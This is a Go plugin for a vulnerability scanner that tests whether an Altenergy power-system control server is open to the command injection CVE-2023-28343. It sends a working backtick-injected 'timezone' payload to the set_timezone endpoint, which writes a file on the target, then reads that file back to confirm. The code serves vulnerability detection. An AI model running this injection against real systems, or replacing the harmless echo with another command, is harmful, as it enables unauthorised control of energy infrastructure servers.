package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"fmt"
	"net/http"
	"strings"
)

func init() {
	Register("altenergy_rce_cve_2023_28343", &altenergy_rce_cve_2023_28343{})
}

type altenergy_rce_cve_2023_28343 struct{}

func (p *altenergy_rce_cve_2023_28343) Info() PluginInfo {
	return PluginInfo{
		Name:     "Altenergy 电力系统控制软件RCE",
		VulnInfo: "Altenergy Power System Control Software是Altenergy Power System公司的微型逆变器控制软件，该系统/set_timezone存在操作系统命令注入漏洞，攻击者可执行任意命令获取服务器权限。",
		VulnID:   "CVE-2023-28343",
		Level:    "9.8 CRITICAL",
		URL:      "https://blog.csdn.net/qq_41904294/article/details/134887839",
		Version:  "C1.2.5",
		CWE:      "CWE-78	OS命令注入",
	}
}

func (p *altenergy_rce_cve_2023_28343) Check(netloc string) bool {
	filename := utils.GenRandom(8)
	rand := utils.GenRandom(10)
	payload := fmt.Sprintf("timezone=`echo %s > %s.txt`", rand, filename)
	req, err := http.NewRequest("POST", netloc+"/index.php/management/set_timezone", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}
	if resp.Other.StatusCode == 200 {
		check_req, err := http.NewRequest("GET", netloc+"/"+filename+".txt", nil)
		if err != nil {
			return false
		}
		check_resp, err := utils.RequestDo(check_req, true, 2)
		if err != nil {
			return false
		}
		if check_resp.Other.StatusCode == 200 && strings.Contains(check_resp.ResponseRaw, rand) {
			return true
		}
	}

	return false

}
